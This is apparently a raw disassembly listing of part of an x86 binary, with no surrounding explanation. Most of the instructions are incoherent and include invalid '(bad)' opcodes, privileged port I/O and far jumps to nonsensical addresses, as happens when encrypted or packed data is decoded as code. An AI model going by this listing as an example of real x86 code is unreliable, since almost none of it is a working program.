  40b0b3:	xchg   edx,eax
  40b0b4:	pop    edi
  40b0b5:	jle    0x40b0bd
  40b0b7:	in     eax,0xd2
  40b0b9:	icebp  
  40b0ba:	pop    ebp
  40b0bb:	not    BYTE PTR [esi]
  40b0bd:	int    0x34
  40b0bf:	inc    esi
  40b0c0:	adc    bl,BYTE PTR ds:0x666e7aa6
  40b0c6:	mov    ch,0xbf
  40b0c8:	leave  
  40b0c9:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40b0ca:	data16 adc BYTE PTR [edi+0x14],dl
  40b0ce:	or     DWORD PTR [edi-0x69df1741],eax
  40b0d4:	loope  0x40b106
  40b0d6:	push   DWORD PTR [ebp+ebx*4-0x61]
  40b0da:	pop    ds
  40b0db:	push   esp
  40b0dc:	sti    
  40b0dd:	xor    bl,BYTE PTR cs:[ebx+0x9b9ab5d]
  40b0e4:	shr    bh,1
  40b0e6:	pop    es
  40b0e7:	into   
  40b0e8:	pop    ebp
  40b0e9:	mov    eax,0xb68b3ab1
  40b0ee:	and    ebp,edx
  40b0f0:	mov    ch,0xdb
  40b0f2:	mov    cl,0x7b
  40b0f4:	repz fidiv WORD PTR gs:[edi+0x72]
  40b0f9:	jb     0x40b0e9
  40b0fb:	push   0x797e49ec
  40b100:	sbb    al,0xb0
  40b102:	fmulp  st(2),st
  40b104:	rol    BYTE PTR [ebx],cl
  40b106:	das    
  40b107:	sub    al,0xef
  40b109:	mov    eax,0x809429b9
  40b10e:	dec    eax
  40b10f:	ficom  DWORD PTR [esi+0x26]
  40b112:	xchg   ebx,eax
  40b113:	aas    
  40b114:	cmp    DWORD PTR [edx-0x26],esi
  40b117:	fstp   st(7)
  40b119:	add    eax,0xd3055779
  40b11e:	lods   al,BYTE PTR ds:[esi]
  40b11f:	nop
  40b120:	(bad)  
  40b121:	pusha  
  40b122:	test   BYTE PTR [edi],dh
  40b124:	adc    eax,0xa33d18a7
  40b129:	or     ch,BYTE PTR [edx]
  40b12b:	dec    edx
  40b12c:	call   0xeb46:0x5c51ac6e
  40b133:	icebp  
  40b134:	mov    ch,0x70
  40b136:	pop    esp
  40b137:	dec    edx
  40b138:	sub    eax,0x39c84991
  40b13d:	cmpps  xmm7,XMMWORD PTR [eax-0x4b],0xb
  40b142:	ins    DWORD PTR es:[edi],dx
  40b143:	push   esp
  40b144:	and    edx,DWORD PTR [edi-0x64]
  40b147:	out    0x84,eax
  40b149:	iret   
  40b14a:	pop    esp
  40b14b:	adc    al,0xa
  40b14d:	stos   BYTE PTR es:[edi],al
  40b14e:	or     eax,0x55ff0067
  40b153:	inc    esp
  40b154:	out    dx,al
  40b155:	or     eax,0xb3eb0a06
  40b15a:	fisttp QWORD PTR ds:0x7dcba174
  40b160:	ds jmp 0x40b0e5
  40b163:	rol    DWORD PTR [esi-0x56dc9ace],0xc0
  40b16a:	pop    edi
  40b16b:	jecxz  0x40b1b0
  40b16d:	ins    DWORD PTR es:[edi],dx
  40b16e:	jbe    0x40b16d
  40b170:	cmp    dl,BYTE PTR ss:[ecx]
  40b173:	call   0x98d73161
  40b178:	rcr    WORD PTR [esi],0x1d
  40b17c:	sbb    eax,0x9685004e
  40b181:	mov    DWORD PTR [ecx+0x68],edi
  40b184:	imul   ebx,DWORD PTR ds:0x21abba89,0xb26b8c74
  40b18e:	mov    dh,0x42
  40b190:	inc    esp
  40b191:	push   ecx
  40b192:	add    eax,0x47bed8c2
  40b197:	jbe    0x40b1b8
  40b199:	push   ecx
  40b19a:	or     eax,0xd0213fde
  40b19f:	sub    al,0x89
  40b1a1:	out    dx,eax
  40b1a2:	adc    eax,0xd5e76d39
  40b1a7:	aas    
  40b1a8:	lock and al,0x9a
  40b1ab:	jbe    0x40b17f
  40b1ad:	push   0xb724196b
  40b1b2:	fst    QWORD PTR [edx]
  40b1b4:	inc    esi
  40b1b5:	cmp    ch,BYTE PTR [ebx+0x59784ece]
  40b1bb:	push   esp
  40b1bc:	xlat   BYTE PTR ds:[ebx]
  40b1bd:	mov    ds:0x39fb654,al
  40b1c2:	mov    edi,0x3144f029
  40b1c7:	add    bl,BYTE PTR [eax]
  40b1c9:	adc    DWORD PTR [eax-0x26731d5c],eax
  40b1cf:	mov    dl,ch
  40b1d1:	stos   DWORD PTR es:[edi],eax
  40b1d2:	jle    0x40b203
  40b1d4:	ins    DWORD PTR es:[edi],dx
  40b1d5:	jb     0x40b1a0
  40b1d7:	inc    esp
  40b1d8:	and    eax,0xf2921750
  40b1dd:	js     0x40b1eb
  40b1df:	cld    
  40b1e0:	jg     0x40b1d0
  40b1e2:	dec    edi
  40b1e3:	or     dl,ah
  40b1e5:	nop
  40b1e6:	je     0x40b188
  40b1e8:	push   ebx
  40b1e9:	fadd   DWORD PTR fs:[edi]
  40b1ec:	dec    ecx
  40b1ed:	pop    ss
  40b1ee:	js     0x40b19c
  40b1f0:	test   eax,0x242db1fb
  40b1f5:	imul   esi,DWORD PTR [ecx],0xffffff84
  40b1f8:	inc    edx
  40b1f9:	xchg   DWORD PTR [edi+0x183d4f8a],ebp
  40b1ff:	icebp  
  40b200:	inc    edx
  40b201:	clc    
  40b202:	loop   0x40b231
  40b204:	retf   0xce1a
  40b207:	mov    eax,ds:0x4c13c6b3
  40b20c:	pushf  
  40b20d:	pusha  
  40b20e:	pusha  
  40b20f:	jl     0x40b20e
  40b211:	mov    bl,0x51
  40b213:	jmp    0x31a29903
  40b218:	and    al,0x5e
  40b21a:	push   0xffffffa0
  40b21c:	and    DWORD PTR [edx+0x48],esi
  40b21f:	popa   
  40b220:	sub    eax,0xe9998780
  40b225:	in     al,0x69
  40b227:	iret   
  40b228:	xor    bl,BYTE PTR gs:[edi]
  40b22b:	mov    al,0x35
  40b22d:	outs   dx,BYTE PTR ds:[esi]
  40b22e:	mov    eax,ds:0x19159db5
  40b233:	pop    ss
  40b234:	shl    bh,cl
  40b236:	xor    esi,DWORD PTR [esi+0x52]
  40b239:	sbb    DWORD PTR [edx],edi
  40b23b:	cmp    al,0xba
  40b23d:	xchg   edx,eax
  40b23e:	lea    eax,[edx-0x3d]
  40b241:	(bad)  
  40b242:	sar    bh,1
  40b244:	jne    0x40b26c
  40b246:	ret    
  40b247:	and    DWORD PTR [ecx+0x66],ebp
  40b24a:	retf   
  40b24b:	xor    ecx,0xebb9b6dd
  40b251:	mov    al,ds:0x4ec308ca
  40b256:	push   ebx
  40b257:	adc    DWORD PTR [edx-0x144aa7c7],ebx
  40b25d:	in     al,dx
  40b25e:	int3   
  40b25f:	pop    ebp
  40b260:	pusha  
  40b261:	jb     0x40b1fa
  40b263:	ins    DWORD PTR es:[edi],dx
  40b264:	cmp    ebp,DWORD PTR [ebx]
  40b266:	push   cs
  40b267:	inc    eax
  40b268:	repz mov cl,0xb7
  40b26b:	mov    dh,0x52
  40b26d:	dec    esi
  40b26e:	mov    cl,0xa2
  40b270:	arpl   WORD PTR [esi-0x4e4c4f35],dx
  40b276:	or     BYTE PTR [eax],ah
  40b278:	movs   BYTE PTR es:[edi],BYTE PTR es:[esi]
  40b27a:	push   edi
  40b27b:	add    eax,0xa8fb7f51
  40b280:	push   ebx
  40b281:	or     bh,dl
  40b283:	lods   al,BYTE PTR ds:[esi]
  40b284:	daa    
  40b285:	dec    ebx
  40b286:	push   edx
  40b287:	and    eax,0x348b8260
  40b28c:	pop    esi
  40b28d:	fist   DWORD PTR [esi+0x758b5786]
  40b293:	mov    ch,0xd2
  40b295:	aaa    
  40b296:	mov    ebp,0x70ae41ac
  40b29b:	jo     0x40b257
  40b29d:	loope  0x40b22b
  40b29f:	jno    0x40b307
  40b2a1:	jg     0x40b2cd
  40b2a3:	(bad)  
  40b2a4:	fucomi st,st(6)
  40b2a6:	jnp    0x40b29d
  40b2a8:	addr16 adc eax,0xabf834fc
  40b2ae:	mov    BYTE PTR [edx-0x4d],ah
  40b2b1:	in     al,0xa0
  40b2b3:	out    dx,eax
  40b2b4:	inc    ebx
  40b2b5:	imul   esp,eax,0x32
  40b2b8:	jp     0x40b2df
  40b2ba:	cmp    eax,0x82927a76
  40b2bf:	jmp    0x40b5d8
  40b2c4:	rol    al,cl
  40b2c6:	(bad)  
  40b2c7:	leave  
  40b2c8:	fcmove st,st(1)
  40b2ca:	rcl    edi,1
  40b2cc:	pop    ss
  40b2cd:	mov    ecx,0x95c3b132
  40b2d2:	ins    BYTE PTR es:[edi],dx
  40b2d3:	(bad)  
  40b2d4:	into   
  40b2d5:	mov    bh,BYTE PTR [eax+0x78]
  40b2d8:	je     0x40b358
  40b2da:	js     0x40b354
  40b2dc:	aas    
  40b2dd:	pop    ss
  40b2de:	dec    edx
  40b2df:	sbb    bh,BYTE PTR ds:[ebx-0x67275cd8]
  40b2e6:	pop    ebx
  40b2e7:	or     ecx,DWORD PTR es:[esi+ebx*8]
  40b2eb:	push   0xecc559a5
  40b2f0:	mov    cs,WORD PTR [eax+eax*1-0x75]
  40b2f4:	cmp    eax,0x46980269
  40b2f9:	mov    esi,esp
  40b2fb:	adc    ch,BYTE PTR [edx-0x31802450]
  40b301:	addr16 cdq 
  40b303:	xor    ebx,DWORD PTR [esi]
  40b305:	(bad)  
  40b306:	repz and al,ch
  40b309:	jecxz  0x40b309
  40b30b:	cld    
  40b30c:	xchg   ecx,eax
  40b30d:	dec    edx
  40b30e:	jl     0x40b38f
  40b310:	loopne 0x40b349
  40b312:	xchg   edi,eax
  40b313:	aam    0xcc
  40b315:	fcmovu st,st(5)
  40b317:	inc    ecx
  40b318:	and    eax,0xc6569458
  40b31d:	push   0x1d
  40b31f:	mov    DWORD PTR [esi+0x4e],eax
  40b322:	jecxz  0x40b2bd
  40b324:	mov    ds:0x786496f,eax
  40b329:	in     eax,0xdb
  40b32b:	cdq    
  40b32c:	mov    ebp,0x828ebabc
  40b331:	cmp    DWORD PTR [edx],esi
  40b333:	sub    ecx,DWORD PTR [ebp-0x329870af]
  40b339:	hlt    
  40b33a:	adc    eax,0xc87144ff
  40b33f:	inc    esp
  40b340:	and    cl,BYTE PTR [edx-0x2c340a0a]
  40b346:	out    0x39,eax
  40b348:	push   0xffffffbd
  40b34a:	outs   dx,DWORD PTR ds:[esi]
  40b34b:	jl     0x40b328
  40b34d:	xchg   DWORD PTR [edi],edi
  40b34f:	int3   
  40b350:	ror    DWORD PTR [ecx+edi*1-0x49],cl
  40b354:	adc    edi,DWORD PTR [edx]
  40b356:	fisubr WORD PTR [ebp+0x753c3794]
  40b35c:	mov    ebx,edx
  40b35e:	iret   
  40b35f:	and    BYTE PTR [esi+0x317f2d3],cl
  40b365:	int    0xf2
  40b367:	scas   al,BYTE PTR es:[edi]
  40b368:	or     esp,DWORD PTR [edi+ebp*8+0x35f22b25]
  40b36f:	adc    al,BYTE PTR [ecx]
  40b371:	cld    
  40b372:	pusha  
  40b373:	mov    ch,0xb1
  40b375:	dec    edi
  40b376:	setge  BYTE PTR [ebx+0xa]
  40b37a:	mov    ch,BYTE PTR [ecx+0x49]
  40b37d:	xor    eax,0x125a8cd0
  40b382:	or     DWORD PTR [ebx],esp
  40b384:	ja     0x40b3da
  40b386:	outs   dx,DWORD PTR ds:[esi]
  40b387:	(bad)  
  40b388:	mov    edi,0x9f8360ef
  40b38d:	stos   DWORD PTR es:[edi],eax
  40b38e:	pop    edx
  40b38f:	pop    ebp
  40b390:	mov    ds:0x909be3b5,al
  40b395:	sbb    BYTE PTR [edi+esi*4+0xf],cl
  40b399:	fprem1 
  40b39b:	ret    0x3fe9
  40b39e:	aaa    
  40b39f:	inc    ebx
  40b3a0:	mov    eax,ds:0xa1965138
  40b3a5:	leave  
  40b3a6:	jmp    0x98ea:0x4eafa403
  40b3ad:	xlat   BYTE PTR ds:[ebx]
  40b3ae:	jns    0x40b39e
  40b3b0:	ins    BYTE PTR es:[edi],dx
  40b3b1:	jnp    0x40b35f
  40b3b3:	jnp    0x40b42e
  40b3b5:	and    bh,0x4c
  40b3b8:	je     0x40b36c
  40b3ba:	cli    
  40b3bb:	jno    0x40b36a
  40b3bd:	test   eax,0xa24392dc
  40b3c2:	jno    0x40b419
  40b3c4:	sub    eax,0xfaa4a974
  40b3c9:	lods   eax,DWORD PTR ds:[esi]
  40b3ca:	test   al,0xc2
  40b3cc:	push   eax
  40b3cd:	jmp    0x9e9c:0xb16847dc
  40b3d4:	fdiv   QWORD PTR [ebx+0x40f8ee4c]
  40b3da:	aaa    
  40b3db:	or     al,0x93
  40b3dd:	shr    BYTE PTR cs:[edi-0xa],0x77
  40b3e2:	(bad)  
  40b3e3:	xchg   edx,eax
  40b3e4:	call   0x1c21fdb7
  40b3e9:	mov    dl,BYTE PTR [edi+0x3b]
  40b3ec:	fprem  
  40b3ee:	mov    dh,0x15
  40b3f0:	cmp    bl,BYTE PTR [ecx+0x6f]
  40b3f3:	xchg   DWORD PTR ds:[edx],ecx
  40b3f6:	and    eax,0x6577e356
  40b3fb:	pop    ecx
  40b3fc:	stos   DWORD PTR es:[edi],eax
  40b3fd:	pusha  
  40b3fe:	xchg   ecx,eax
  40b3ff:	fld    QWORD PTR [ebx+0x5e]
  40b402:	jle    0x40b44d
  40b404:	sar    DWORD PTR [edi-0x5b],cl
  40b407:	retf   0x13b4
  40b40a:	outs   dx,BYTE PTR ds:[esi]
  40b40b:	jg     0x40b3ac
  40b40d:	pusha  
  40b40e:	out    0x53,al
  40b410:	mov    edx,0x6009a3ac
  40b415:	ficomp WORD PTR [esi+eiz*8]
  40b418:	cmp    eax,0x7303add
  40b41d:	jb     0x40b479
  40b41f:	fiadd  DWORD PTR [eax+0x5109b005]
  40b425:	cld    
  40b426:	mov    cl,0x2e
  40b428:	mov    dh,0xd3
  40b42a:	in     al,dx
  40b42b:	sbb    eax,0xaaf40efd
  40b430:	out    0xbb,eax
  40b432:	jbe    0x40b434
  40b434:	not    BYTE PTR [edi]
  40b436:	sub    DWORD PTR [ebx-0x48],ebx
  40b439:	out    0xef,al
  40b43b:	fadd   st(6),st
  40b43d:	adc    BYTE PTR [esi-0x61d4e22b],dl
  40b443:	daa    
  40b444:	jle    0x40b4c3
  40b446:	call   DWORD PTR [eax+eiz*4-0x51]
  40b44a:	or     al,0x70
  40b44c:	nop
  40b44d:	(bad)  
  40b44e:	fcmovnb st,st(3)
  40b450:	mov    ds:0x9d57a91b,eax
  40b455:	out    dx,eax
  40b456:	repnz cmps BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40b458:	pop    edi
  40b459:	mov    ah,0xa6
  40b45b:	outs   dx,BYTE PTR ds:[esi]
  40b45c:	jns    0x40b3e0
  40b45e:	repz sbb eax,0x9602a335
  40b464:	jae    0x40b3f6
  40b466:	jg     0x40b40f
  40b468:	cmp    al,0x74
  40b46a:	sub    al,0x34
  40b46c:	and    al,BYTE PTR ds:0x69cd319b
  40b472:	sbb    eax,0x6989403
  40b477:	sbb    esp,DWORD PTR [edx-0x233823f4]
  40b47d:	cli    
  40b47e:	aad    0x72
  40b480:	mov    esp,0x8165663a
  40b485:	rcl    DWORD PTR [esi+edi*1+0xb],cl
  40b489:	dec    esi
  40b48a:	mov    ah,0x1e
  40b48c:	jge    0x40b4c6
  40b48e:	test   BYTE PTR [edi-0x7c9f0d1e],0x31
  40b495:	mov    dl,0xc6
  40b497:	mov    eax,ds:0x74f464e6
  40b49c:	pop    ss
  40b49d:	(bad)
  40b4a2:	dec    edx
  40b4a3:	ins    DWORD PTR es:[edi],dx
  40b4a4:	ss or  al,0xf5
  40b4a7:	jp     0x40b47a
  40b4a9:	inc    edx
  40b4aa:	popf   
  40b4ab:	pop    esi
  40b4ac:	or     DWORD PTR [eax-0x54],0xc049dfba
  40b4b3:	rol    DWORD PTR [esi+0x51],0xc2
  40b4b7:	mul    DWORD PTR [edi-0xa]
  40b4ba:	sub    ebx,DWORD PTR [ebp+0xa]
  40b4bd:	pop    edx
  40b4be:	pop    edx
  40b4bf:	xchg   edx,eax
  40b4c0:	add    al,0x78
  40b4c2:	test   BYTE PTR [ebx],bh
  40b4c4:	dec    edx
  40b4c5:	cld    
  40b4c6:	ror    DWORD PTR [eax+esi*2-0x31a59cb0],cl
  40b4cd:	iret   
  40b4ce:	cmp    al,0xec
  40b4d0:	or     edi,DWORD PTR ds:0x2bacff6d
  40b4d6:	xlat   BYTE PTR ds:[ebx]
  40b4d7:	fdivr  QWORD PTR [ecx]
  40b4d9:	pop    eax
  40b4da:	xchg   ebx,eax
  40b4db:	arpl   WORD PTR [edx+0x214903e2],bx
  40b4e1:	lock leave 
  40b4e3:	pop    edx
  40b4e4:	daa    
  40b4e5:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40b4e6:	int3   
  40b4e7:	in     eax,dx
  40b4e8:	cmps   DWORD PTR ds:[si],DWORD PTR es:[di]
  40b4ea:	test   ecx,0xe4837802
  40b4f0:	idiv   DWORD PTR [eax-0x20]
  40b4f3:	jle    0x40b4a4
  40b4f5:	mov    ds:0xe3522a63,eax
  40b4fa:	xchg   esp,eax
  40b4fb:	rol    DWORD PTR [eax-0x48],0xbd
  40b4ff:	daa    
  40b500:	mov    edx,DWORD PTR [edx-0x58]
  40b503:	ret    
  40b504:	or     BYTE PTR [esi-0x2c],bl
  40b507:	cmp    ebx,esp
  40b509:	ret    0x5179
  40b50c:	dec    ecx
  40b50d:	xchg   BYTE PTR [ebp+0x19b8af25],ah
  40b513:	fcomp  DWORD PTR [edi+eiz*2+0x7d612a31]
  40b51a:	sbb    ecx,DWORD PTR [ebx-0x5e]
  40b51d:	ins    BYTE PTR es:[edi],dx
  40b51e:	(bad)  
  40b51f:	fucomip st,st(5)
  40b521:	adc    eax,0x97cebbeb
  40b526:	mov    ah,0xb0
  40b528:	add    bh,BYTE PTR [ebx+0x76]
  40b52b:	and    cl,ch
  40b52d:	jne    0x40b59f
  40b52f:	sub    BYTE PTR [ecx+0x74],ah
  40b532:	lods   al,BYTE PTR ds:[esi]
  40b533:	mov    ebx,0x80b46984
  40b538:	jnp    0x40b50a
  40b53a:	lds    edi,FWORD PTR ds:0x980c291c
  40b540:	in     eax,0xc1
  40b542:	inc    edi
  40b543:	xor    edi,eax
  40b545:	cdq    
  40b546:	repz and ebx,esp
  40b549:	aaa    
  40b54a:	add    ebx,eax
  40b54c:	inc    ecx
  40b54d:	mov    ebx,0x714a02c
  40b552:	rcl    BYTE PTR [ebx-0x54b769e1],1
  40b558:	icebp  
  40b559:	lahf   
  40b55a:	adc    BYTE PTR [esi],dh
  40b55c:	push   0xa2f808c9
  40b561:	dec    edx
  40b562:	retf   
  40b563:	mov    dh,0x8b
  40b565:	push   ss
  40b566:	aad    0xb9
  40b568:	mov    ch,0x96
  40b56a:	jns    0x40b595
  40b56c:	test   eax,0x95a3e776
  40b571:	xor    cl,cl
  40b573:	sub    bh,BYTE PTR [esi-0x6803841]
  40b579:	mov    DWORD PTR [edx+0x9],esi
  40b57c:	xor    DWORD PTR [ecx+0x64b1e9e2],ebp
  40b582:	jmp    0x40b5c8
  40b584:	sub    ebx,edi
  40b586:	mov    ecx,DWORD PTR [esp+eax*4+0x6c]
  40b58a:	xor    ebx,DWORD PTR ss:[edx]
  40b58d:	adc    al,0x26
  40b58f:	adc    BYTE PTR [edi-0x1d],0x88
  40b593:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40b594:	mov    esi,0x50cbdf8a
  40b599:	or     eax,0xe446cec7
  40b59e:	push   ebp
  40b59f:	sbb    al,0x42
  40b5a1:	cld    
  40b5a2:	cdq    
  40b5a3:	dec    edi
  40b5a4:	xor    cl,bl
  40b5a6:	loopne 0x40b5c7
  40b5a8:	(bad)  
  40b5a9:	jl     0x40b5be
  40b5ab:	mov    ds:0x3affdd74,al
  40b5b0:	clc    
  40b5b1:	xchg   ecx,eax
  40b5b2:	shl    BYTE PTR [esi],cl
  40b5b4:	add    DWORD PTR [edx+0x1f5bb663],esi
  40b5ba:	icebp  
  40b5bb:	loopne 0x40b5f8
  40b5bd:	dec    ebp
  40b5be:	pusha  
  40b5bf:	push   ds
  40b5c0:	mov    al,ds:0x40cc2e9c
  40b5c5:	rcl    BYTE PTR [ebx+0x183829fd],cl
  40b5cb:	out    0xe1,al
  40b5cd:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40b5ce:	mov    ds:0x5c8b1cfe,al
  40b5d3:	sti    
  40b5d4:	ins    DWORD PTR es:[edi],dx
  40b5d5:	cmp    BYTE PTR [eax+0x17840ff1],0x0
  40b5dc:	add    BYTE PTR [eax],al
  40b5de:	mov    eax,DWORD PTR [ebp-0x1c]
  40b5e1:	or     DWORD PTR [eax],0x60751c9d
  40b5e7:	mov    eax,DWORD PTR [ebp-0x8]
  40b5ea:	xor    eax,ecx
  40b5ec:	add    eax,esi
  40b5ee:	pop    edi
  40b5ef:	pop    esi
  40b5f0:	pop    ebx
  40b5f1:	leave  
  40b5f2:	ret    0x4
  40b5f5:	mov    eax,DWORD PTR [ebp-0xc]
  40b5f8:	add    eax,DWORD PTR [ebp-0x18]
  40b5fb:	jmp    0x40b914
  40b600:	leave  
  40b601:	xlat   BYTE PTR ds:[ebx]
  40b602:	ret    
  40b603:	rcl    cl,0xd4
  40b606:	leave  
  40b607:	fldcw  WORD PTR [esi-0x6f332a7c]
  40b60d:	and    edi,DWORD PTR gs:[edx-0x36]
  40b611:	(bad)  
  40b612:	js     0x40b68c
  40b614:	je     0x40b694
  40b616:	js     0x40b690
  40b618:	outs   dx,DWORD PTR ds:[esi]
  40b619:	mov    ebx,0xa476ece7
  40b61e:	sahf   
  40b61f:	sbb    eax,0xc3611466
  40b624:	fist   WORD PTR [ebx+edx*2]
  40b627:	or     ah,BYTE PTR [edi+0x36]
  40b62a:	loop   0x40b5ac
  40b62c:	clc    
  40b62d:	adc    eax,esi
  40b62f:	mov    dh,0xbd
  40b631:	and    al,0x83
  40b633:	or     al,0x54
  40b635:	add    esp,DWORD PTR [ebx+edx*2+0x63]
  40b639:	jbe    0x40b6b7
  40b63b:	inc    ebx
  40b63c:	pop    ss
  40b63d:	xor    BYTE PTR [eax-0x15],al
  40b640:	lods   al,BYTE PTR ds:[esi]
  40b641:	ins    BYTE PTR es:[edi],dx
  40b642:	xchg   esp,eax
  40b643:	sahf   
  40b644:	loopne 0x40b668
  40b646:	xor    bh,BYTE PTR [ecx+0x0]
  40b649:	and    BYTE PTR [edx],ah
  40b64b:	add    edi,esi
  40b64d:	mov    bl,0x67
  40b64f:	mov    ebp,0xd3064b52
  40b654:	iret   
  40b655:	shl    DWORD PTR [ebx+0x14],1
  40b658:	adc    BYTE PTR [ebx],bh
  40b65a:	sub    bl,BYTE PTR [esi+eax*1+0x79]
  40b65e:	leave  
  40b65f:	(bad)  
  40b660:	fiadd  WORD PTR [ecx-0x79]
  40b663:	lds    edx,FWORD PTR [esi-0x3e]
  40b666:	push   eax
  40b667:	inc    ebp
  40b668:	dec    ecx
  40b669:	leave  
  40b66a:	loop   0x40b6c1
  40b66c:	ins    DWORD PTR es:[edi],dx
  40b66d:	push   esp
  40b66e:	test   BYTE PTR [edi+eiz*2-0x49906013],bh
  40b675:	cmp    DWORD PTR [ebx],ebx
  40b677:	sbb    bh,bl
  40b679:	mov    ah,0x57
  40b67b:	xor    BYTE PTR ds:0x62d44c14,cl
  40b681:	xchg   edx,eax
  40b682:	stos   BYTE PTR es:[edi],al
  40b683:	jno    0x40b6d3
  40b685:	push   0xffffff88
  40b687:	in     eax,dx
  40b688:	mov    DWORD PTR [edi-0x105572a5],ecx
  40b68e:	mov    ebx,0x340a7a8
  40b693:	adc    eax,0x7b503ed
  40b698:	outs   dx,DWORD PTR ds:[esi]
  40b699:	stos   BYTE PTR es:[edi],al
  40b69a:	sbb    BYTE PTR [ebx-0x12],bl
  40b69d:	outs   dx,DWORD PTR ds:[esi]
  40b69e:	lea    ecx,ds:0x54eecd01
  40b6a4:	cmp    eax,0x7889866d
  40b6a9:	gs pop ebp
  40b6ab:	lock inc edx
  40b6ad:	cmp    BYTE PTR [eax-0x40e1ebc0],0x25
  40b6b4:	mov    ch,0x61
  40b6b6:	inc    ebx
  40b6b7:	jp     0x40b68f
  40b6b9:	jnp    0x40b706
  40b6bb:	fmul   QWORD PTR [edi+0x31]
  40b6be:	(bad)  
  40b6bf:	ficom  WORD PTR [ecx+0x72c49d93]
  40b6c5:	in     al,dx
  40b6c6:	retf   
  40b6c7:	xor    al,0xd9
  40b6c9:	jp     0x40b665
  40b6cb:	pop    eax
  40b6cc:	jmp    0x40b721
  40b6ce:	ins    BYTE PTR es:[edi],dx
  40b6cf:	mov    ah,0x1e
  40b6d1:	in     eax,dx
  40b6d2:	lods   eax,DWORD PTR ds:[esi]
  40b6d3:	dec    ebp
  40b6d4:	and    al,BYTE PTR [eax+0x62]
  40b6d7:	or     esi,ebx
  40b6d9:	scas   al,BYTE PTR es:[edi]
  40b6da:	pop    ss
  40b6db:	ret    
  40b6dc:	xchg   ebx,eax
  40b6dd:	loopne 0x40b684
  40b6df:	sbb    BYTE PTR [ebx],bh
  40b6e1:	mov    ebp,0x99746495
  40b6e6:	(bad)  
  40b6e7:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40b6e8:	ret    0x71be
  40b6eb:	push   edx
  40b6ec:	adc    ecx,DWORD PTR [ebx-0x65]
  40b6ef:	jbe    0x40b75f
  40b6f1:	les    eax,FWORD PTR [esi]
  40b6f3:	jle    0x40b719
  40b6f5:	mov    edi,0xe43b52f9
  40b6fa:	pop    ebp
  40b6fb:	adc    BYTE PTR [ecx-0x44],0x53
  40b6ff:	mov    ds:0x36c72b42,eax
  40b704:	ins    DWORD PTR es:[edi],dx
  40b705:	outs   dx,DWORD PTR ds:[esi]
  40b706:	push   esi
  40b707:	addr16 or ah,al
  40b70a:	dec    edi
  40b70b:	push   ebp
  40b70c:	fcomp  DWORD PTR [ebx+esi*2+0x3bed7dcb]
  40b713:	pushf  
  40b714:	scas   al,BYTE PTR es:[edi]
  40b715:	pop    es
  40b716:	dec    esi
  40b717:	and    edi,edx
  40b719:	sbb    al,0xf6
  40b71b:	(bad)  
  40b71c:	push   esp
  40b71e:	pop    ss
  40b71f:	xchg   edi,eax
  40b720:	mov    ebp,0xce0f0ac2
  40b725:	fdivr  DWORD PTR [eax+0x18620342]
  40b72b:	dec    ebx
  40b72c:	dec    ebx
  40b72d:	retf   
  40b72e:	sbb    DWORD PTR [ecx+0xb],ebx
  40b731:	stos   BYTE PTR es:[edi],al
  40b732:	pop    es
  40b733:	sub    dh,BYTE PTR [esi]
  40b735:	cmp    esi,edx
  40b737:	adc    BYTE PTR [esi],dl
  40b739:	rcl    DWORD PTR [ecx+0x7],0x93
  40b73d:	cdq    
  40b73e:	stos   BYTE PTR es:[edi],al
  40b73f:	cmp    cl,BYTE PTR [eax-0x7e0cad88]
  40b745:	lock stos DWORD PTR es:[edi],eax
  40b747:	mov    BYTE PTR [ebp-0x15],dh
  40b74a:	mov    ch,0xd
  40b74c:	jb     0x40b6cf
  40b74e:	and    dl,ch
  40b750:	aaa    
  40b751:	push   ds
  40b752:	dec    esp
  40b753:	test   DWORD PTR ds:0x2b765746,ecx
  40b759:	fsub   st(7),st
  40b75b:	mov    BYTE PTR [ecx-0x6676d90c],ah
  40b761:	call   ebp
  40b763:	adc    eax,DWORD PTR [eax-0x4f918067]
  40b769:	mov    cl,0x1
  40b76b:	adc    BYTE PTR [edi],dh
  40b76d:	add    BYTE PTR [eax+0x23],ch
  40b770:	js     0x40b78e
  40b772:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40b773:	ds add eax,0xe30f6733
  40b779:	xchg   edi,eax
  40b77a:	mov    ds:0x6b184efd,al
  40b77f:	mov    ecx,0x4db25cf0
  40b784:	add    eax,0x7b51a4b9
  40b789:	outs   dx,BYTE PTR ds:[esi]
  40b78a:	dec    edi
  40b78b:	push   es
  40b78c:	retf   
  40b78d:	out    0xc9,eax
  40b78f:	cwde   
  40b790:	push   eax
  40b791:	stc    
  40b792:	push   0xf6287ef7
  40b797:	xchg   esi,eax
  40b798:	xchg   edi,eax
  40b799:	mov    ebx,0x5b8626ad
  40b79e:	sbb    esi,ebp
  40b7a0:	or     al,0x44
  40b7a2:	call   0x1c28:0x69a221fe
  40b7a9:	push   0xfffffff4
  40b7ab:	shl    DWORD PTR [edx+0x5b],0x37
  40b7af:	call   0x9509e092
  40b7b4:	inc    ebx
  40b7b5:	ficomp DWORD PTR [eax-0x28]
  40b7b8:	lock popf 
  40b7ba:	pop    ecx
  40b7bb:	rol    BYTE PTR [edi],1
  40b7bd:	loopne 0x40b7ac
  40b7bf:	aaa    
  40b7c0:	mov    ebx,0x381579b1
  40b7c5:	mov    esi,0x812a7fe2
  40b7ca:	adc    eax,0x703404d2
  40b7cf:	xorps  xmm5,XMMWORD PTR [si-0x2e0d]
  40b7d5:	nop
  40b7d6:	mov    esp,0xa0ce0782
  40b7db:	and    edi,ebx
  40b7dd:	xor    BYTE PTR [ecx+0x7e5fb9e2],bl
  40b7e3:	fbld   TBYTE PTR [edi+ebx*4]
  40b7e6:	bound  esp,QWORD PTR [ebx+0x2c]
  40b7e9:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40b7ea:	adc    edx,DWORD PTR [edi+0x46615f8a]
  40b7f0:	pop    es
  40b7f1:	or     ebp,DWORD PTR [esi+0x1f59af15]
  40b7f7:	jae    0x40b84d
  40b7f9:	mov    ecx,0xc5ea46de
  40b7fe:	xor    ecx,esp
  40b800:	push   ss
  40b801:	push   es
  40b802:	fld    QWORD PTR [eax+0x58]
  40b805:	jecxz  0x40b7eb
  40b807:	inc    esi
  40b808:	stc    
  40b809:	mov    ah,BYTE PTR [edx]
  40b80b:	test   eax,0xcc95e5c6
